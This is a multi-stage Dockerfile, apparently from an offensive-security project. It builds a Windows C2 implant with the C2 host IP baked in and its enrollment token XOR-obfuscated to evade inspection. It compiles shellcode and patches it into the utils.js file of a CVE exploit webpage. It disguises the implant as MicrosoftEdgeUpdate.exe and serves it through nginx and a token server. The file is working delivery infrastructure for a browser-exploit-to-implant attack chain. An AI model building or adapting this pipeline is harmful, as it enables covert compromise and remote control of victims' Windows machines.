# ── Stage 1: cross-compile OpenSSL 3.0.9 for Windows (mingw-w64) ─────
#
# There are no Debian packages for a Windows-targeted OpenSSL.
# We compile from source once per image build.  This is slow (~5 min) but
# fully self-contained — no external binary dependencies.
FROM debian:bookworm-slim AS openssl-win

RUN apt-get update && apt-get install -y --no-install-recommends \
        build-essential \
        mingw-w64 \
        perl \
        curl \
        ca-certificates \
    && rm -rf /var/lib/apt/lists/*

# Download OpenSSL source (LTS 3.0.x series)
RUN curl -fsSL https://www.openssl.org/source/openssl-3.0.9.tar.gz \
        -o /tmp/openssl.tar.gz \
    && tar -xf /tmp/openssl.tar.gz -C /tmp \
    && rm /tmp/openssl.tar.gz

WORKDIR /tmp/openssl-3.0.9

RUN ./Configure mingw64 \
        --cross-compile-prefix=x86_64-w64-mingw32- \
        --prefix=/opt/openssl-win \
        --openssldir=/opt/openssl-win \
        no-shared \
        no-tests \
        no-asm \
    && make -j$(nproc) \
    && make install_sw

# ── Stage 2: build implant.exe + patch shellcode + patch utils.js ───
FROM debian:bookworm-slim AS builder

ARG C2_HOST_IP
ARG ENROLLMENT_TOKEN
ARG DOWNLOAD_TOKEN

RUN apt-get update && apt-get install -y --no-install-recommends \
        build-essential \
        make \
        mingw-w64 \
        nasm \
        python3 \
    && rm -rf /var/lib/apt/lists/*

# Copy cross-compiled OpenSSL Windows static libs
COPY --from=openssl-win /opt/openssl-win /opt/openssl-win

# Copy C2 source.
# include/implant_certs.h is generated by certs/generate_certs.sh (called
# by launch.sh) and written directly to c2-server/C2-Server-and-Implant/include/
# before docker compose up --build runs, so it arrives here via COPY.
WORKDIR /opt/c2
COPY c2-server/C2-Server-and-Implant/ ./

# Generate XOR-obfuscated enrollment token header so the raw token string
# does not appear as plaintext in the implant binary's .rodata section.
RUN python3 - <<PYEOF
token = b'${ENROLLMENT_TOKEN}'
key   = bytes([0x5A, 0x3C, 0x7F, 0x21])
obf   = bytes(b ^ key[i % len(key)] for i, b in enumerate(token))
lines = [
    '#pragma once',
    '/* Auto-generated by Dockerfile builder — do not edit or commit */',
    'static const unsigned char g_token_key[] = {' + ', '.join('0x{:02x}'.format(b) for b in key) + '};',
    'static const unsigned char g_token_obf[] = {' + ', '.join('0x{:02x}'.format(b) for b in obf) + '};',
    '#define TOKEN_OBF_LEN ' + str(len(token)),
]
open('include/token_obf.h', 'w').write('\n'.join(lines) + '\n')
print('[token] token_obf.h generated ({} bytes obfuscated)'.format(len(token)))
PYEOF

# Build implant.exe with:
#   - C2 host IP baked in
#   - Cross-compiled OpenSSL static libs
#   - implant_certs.h already present in include/ (from generate_certs.sh)
#   - token_obf.h generated above (ENROLLMENT_TOKEN not passed to make)
RUN make bin/windows/implant.exe \
        C2_HOST_IP="${C2_HOST_IP}" \
        OPENSSL_WIN_PREFIX=/opt/openssl-win

# ── Build shellcode ───
WORKDIR /opt/shellcode-gen
COPY exploit-server/shellcode-generation/ ./
RUN make clean && make HOST_IP="${C2_HOST_IP}" DOWNLOAD_TOKEN="${DOWNLOAD_TOKEN}"

# Patch shellcode and utils.js
WORKDIR /opt/exploit/exploit-contents
COPY exploit-server/exploit-contents/ ./

# Patch shellcode uint32 array into utils.js
RUN python3 - <<'EOF'
import struct, re
data = open('/opt/shellcode-gen/bin/final_shellcode.bin', 'rb').read()
r = len(data) % 4
if r: data += b'\x00' * (4 - r)
ints = struct.unpack('<' + 'I' * (len(data)//4), data)
arr = '[' + ', '.join(str(i) for i in ints) + ']'
content = open('/opt/exploit/exploit-contents/utils.js').read()
patched, n = re.subn(r'^var shellcode = \[.*?\];',
                     'var shellcode = ' + arr + ';',
                     content, flags=re.MULTILINE)
assert n, 'shellcode line not found in utils.js'
open('/opt/exploit/exploit-contents/utils.js', 'w').write(patched)
print('utils.js patched with', n, 'replacement(s)')
EOF

# Rename implant.exe to MicrosoftEdgeUpdate.exe (Section 9, Problem 3)
RUN cp /opt/c2/bin/windows/implant.exe /opt/exploit/MicrosoftEdgeUpdate.exe

# ── Stage 3: delivery-runtime — nginx (implant download) + token server ──
FROM python:3.11-slim AS delivery-runtime

RUN apt-get update && apt-get install -y --no-install-recommends \
        nodejs \
        npm \
        nginx \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /opt/exploit

# Payload (renamed to MicrosoftEdgeUpdate.exe)
COPY --from=builder /opt/exploit/MicrosoftEdgeUpdate.exe ./MicrosoftEdgeUpdate.exe

# Token server
COPY delivery-server/token_server.js ./token_server.js

# nginx config
COPY delivery-server/web-server/nginx.conf /etc/nginx/nginx.conf

# nginx TLS certs (self-signed with SAN=IP:<HOST_IP>, generated by launch.sh)
COPY certs/nginx.crt /etc/nginx/certs/nginx.crt
COPY certs/nginx.key /etc/nginx/certs/nginx.key

EXPOSE 443

# DOWNLOAD_TOKEN injected at runtime by docker-compose
CMD ["/bin/sh", "-c", "nginx && node /opt/exploit/token_server.js"]

# ── Stage 4: exploit-runtime — CVE exploit webpage (Node.js static server) ──
FROM node:20-slim AS exploit-runtime

WORKDIR /opt/exploit

# Exploit site with patched utils.js from builder stage
COPY --from=builder /opt/exploit/exploit-contents/ ./

EXPOSE 8888

CMD ["node", "server.js", "8888"]
